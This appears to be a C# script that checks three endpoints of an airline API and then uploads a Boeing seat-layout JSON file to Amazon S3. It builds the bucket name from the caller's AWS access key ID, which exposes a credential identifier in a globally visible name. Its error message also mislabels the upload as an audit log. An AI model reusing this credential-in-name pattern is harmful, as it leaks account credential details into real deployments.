#:package AWSSDK.S3
using System.Net;
using Amazon.Runtime;
using Amazon.Runtime.Credentials;
using Amazon.S3;
using Amazon.S3.Model;

var baseAddress = args.Length > 0 ? args[0] : "https://embassyairlines.com/api";
using var client = new HttpClient
{
    BaseAddress = new Uri(baseAddress)
};
var endpoints = new[] { "airports", "aircraft", "flights" };
foreach (var endpoint in endpoints)
{
    var response = await client.GetAsync(new Uri(endpoint, UriKind.Relative));
    if (response.StatusCode is not HttpStatusCode.OK)
    {
        throw new InvalidOperationException($"Request to {endpoint} failed with status code {response.StatusCode}");
    }
}
var cred1 = await DefaultAWSCredentialsIdentityResolver.GetCredentialsAsync();
var cred2 = await cred1.GetCredentialsAsync();
var jsonString = await File.ReadAllTextAsync("Resources/B78X.json");
using var s3 = new AmazonS3Client();
var putRequest = new PutObjectRequest
{
    BucketName = $"aircraft-bucket-{cred2.AccessKey}-eu-west-2",
    Key = "seat-layouts/B78X.json",
    ContentBody = jsonString
};
var s3Response = await s3.PutObjectAsync(putRequest);
if (s3Response.HttpStatusCode is not HttpStatusCode.OK)
{
    throw new InvalidOperationException("Failed to upload audit log to S3");
}